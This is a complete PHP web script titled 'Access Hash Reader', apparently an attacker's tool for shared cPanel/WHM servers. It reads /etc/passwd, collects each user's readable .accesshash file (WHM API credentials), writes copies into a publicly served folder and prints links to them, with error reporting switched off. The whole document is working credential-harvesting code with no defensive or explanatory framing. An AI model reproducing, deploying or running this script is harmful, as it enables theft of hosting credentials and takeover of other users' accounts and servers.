<?php
error_reporting(0);
set_time_limit(0);
?>
<center>
<h3>Access Hash Reader</h3>
<form method="post">
<input type="submit" name="go" value="Check">
</form>
 
 
<?php
if (isset($_POST['go'])){
$users=file("/etc/passwd");
if (!$users) {
die('<font color="red"><b>[-] Error : Cannot Read /etc/passwd</b></font>');
}
@mkdir('accesshash', 0755);
@chdir('accesshash');
$x=0;
foreach($users as $user){
$usr=explode(":",$user);
$dir='/home/'.$usr[0].'/.accesshash';
if (is_readable($dir)){
$p=file_get_contents($dir);
$newfile="WHM ".$usr[0].":".str_replace("\n","",$p);
file_put_contents($usr[0]."-accesshash.txt",$newfile);
$x+=1;
echo '[+] Found: <font color="green"><a href="accesshash/'.$usr[0].'-accesshash.txt" target="_blank">'.$usr[0]."-accesshash.txt".'</a></font><br>';
}
}
echo '<font color="blue"><h3>Total Hash Found = '.$x.'<br><a target="_blank" href="accesshash/">Hash list</a></h3>';
}
?>
